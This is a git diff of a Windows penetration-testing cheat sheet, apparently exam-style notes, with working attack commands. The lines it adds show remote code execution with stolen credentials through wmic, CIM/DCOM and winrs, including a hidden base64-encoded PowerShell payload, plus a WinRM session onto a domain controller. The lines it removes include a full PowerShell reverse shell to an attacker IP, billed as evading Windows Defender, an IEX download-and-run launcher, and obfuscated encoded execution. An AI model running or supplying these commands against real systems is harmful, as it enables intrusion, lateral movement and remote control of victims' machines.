@@ -717,7 +717,7 @@ c:\>powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke
 * nmap scripts
 * crackmapexec
 
-## RPC
+### RPC
 
 * Dump services
 
@@ -726,24 +726,68 @@ c:\>powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke
 * Map RPC service
 `impacket-rpcmap -no-pass -target-ip TARGET_IP ncacn_np:\\JEFF[\PIPE\atsvc]`
 
-# Reverse Shells
+### wmic 
 
-## Powershell
-* This is the most basic reverse shell not detectable by Windows Defender
-* Replace xxx as needed:
-* raw.ps1
+* If you got creds and WMI is open on the target (only older machines), gain RCE using wmic on win host locally
+
+`wmic /node:192.168.50.xxxx /user:bob101 /password:Password! process call create "calc"`
+
+* Same on powershell
+
+```powershell
+
+$username = 'user101';
+$password = 'Password!';
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+
+
+$options = New-CimSessionOption -Protocol DCOM
+$session = New-Cimsession -ComputerName 192.168.xx.xxx -Credential $credential -SessionOption $Options 
+$command = 'calc';
+
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
 
 ```
-$client = New-Object System.Net.Sockets.TCPClient('192.168.219.xxx',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PSReverseShell# ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close();
-```
-
-* launch on target
-```
-powershell.exe -NoP -NonI -W Hidden -Exec Bypass "IEX(New-Object Net.WebClient).downloadString('http://192.168.219.xxx/raw.ps1')"
-```
 
 
-## Meterpreter
+* Or remotely using winrs on windows
+
+```powershell
+
+winrs -r:pc_name -u:user101 -p:Password!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
+HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
+
+```
+
+### WinRM
+
+* attack from local  host
+
+```powershell
+
+$username = 'user101';
+$password = 'Password!';
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+
+New-PSSession -ComputerName 192.168.xx.xx -Credential $credential
+
+ Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
+ -- ----            ------------    ------------    -----         -----------------     ------------
+  1 WinRM1          192.168.xx.xx   RemoteMachine   Opened        
+
+PS C:\Users\jeff> Enter-PSSession 1
+[192.168.50.73]: PS C:\Users\user101\Documents> whoami
+corp\user101
+
+[192.168.50.73]: PS C:\Users\user101\Documents> hostname
+DC001
+
+```
+
+
+### Meterpreter
 This shell works even on Windows 11 but needs MSF
 
 1. SMB delivery: `use windows/smb/smb/delivery`
@@ -754,10 +798,10 @@ This shell works even on Windows 11 but needs MSF
 6. Get shell: `shell`
 
 
-# Escalation
+## Privelege Escalation
 
 
-## Kernel exploits
+### Kernel exploits
 
 see https://github.com/jonnyzar/windows-kernel-exploits
 
@@ -849,35 +893,12 @@ Action"
 powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow
 
 ```
-# Security Bypass and Obduscation
 
-## Encoded Powershell Execution
 
-```
-# Generator
-$command = 'Write-Output "Try Harder"'
-$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
-$base64 = [Convert]::ToBase64String($bytes)
 
-# Launcher
-powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc 'VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAFQAcgB5ACAASABhAHIAZABlAHIAIgAgAA=='
-```
-credits to https://www.offensive-security.com/offsec/powershell-obfuscation/
+### Encoded Powershell Execution
 
-## Encode and Decode binary file to transfer it to victim
 
-```
-# encode from binary file to base64txt
-
-powershell -C "& {$outpath = (Join-Path (pwd) 'out_base64.txt'); $inpath = (Join-Path (pwd) 'data.jpg'); [IO.File]::WriteAllText($outpath, ([convert]::ToBase64String(([IO.File]::ReadAllBytes($inpath)))))}"
-
-# decode from base64txt to binary file
-
-powershell -C "& {$outpath = (Join-Path (pwd) 'outdata2.jpg'); $inpath = (Join-Path (pwd) 'out_base64.txt'); [IO.File]::WriteAllBytes($outpath, ([convert]::FromBase64String(([IO.File]::ReadAllText($inpath)))))}"
-
-```
-
-big thanks for the skript to https://gist.github.com/t2psyto
 
 
 
